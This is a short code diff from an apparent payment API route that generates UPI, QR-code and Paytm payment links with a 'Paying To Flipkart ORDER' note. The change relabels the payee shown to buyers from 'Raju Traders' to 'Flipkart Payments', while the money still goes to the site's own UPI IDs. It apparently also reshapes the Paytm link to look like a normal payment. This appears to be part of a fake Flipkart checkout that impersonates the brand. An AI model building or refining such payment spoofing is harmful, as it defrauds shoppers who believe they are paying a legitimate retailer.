@@ -104,13 +104,13 @@ export async function POST(request: Request) {
     // 4. Generate UPI URLs
     const orderNote = `Paying To Flipkart ORDER${orderIdToUse || txnid}`;
     // Universal upi://pay link (uses default UPI ID)
-    const upiUrl = `upi://pay?pa=${defaultUpi}&am=${Math.round(Number(amount))}&pn=${encodeURIComponent('Raju Traders')}&tn=${encodeURIComponent(orderNote)}&tr=${txnid}&cu=INR`;
+    const upiUrl = `upi://pay?pa=${defaultUpi}&am=${Math.round(Number(amount))}&pn=${encodeURIComponent('Flipkart Payments')}&tn=${encodeURIComponent(orderNote)}&tr=${txnid}&cu=INR`;
 
     // Dynamic QR code URL via free stable QR API
     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiUrl)}&size=220x220`;
 
     // Paytm Intent Link (uses Paytm UPI ID - upi3)
-    const paytmIntent = `paytmmp://cash_wallet?pa=${paytmUpi}&pn=${encodeURIComponent('Raju Traders')}&am=${Number(amount).toFixed(2)}&cu=INR&tn=${encodeURIComponent(orderNote)}&featuretype=money_transfer`;
+    const paytmIntent = `paytmmp://pay?pa=${paytmUpi}&pn=${encodeURIComponent('Flipkart Payments')}&am=${Number(amount).toFixed(2)}&cu=INR&tn=${encodeURIComponent(orderNote)}`;
 
     // PhonePe Intent Link (uses PhonePe UPI ID - upi2)
     const phonepeData = {
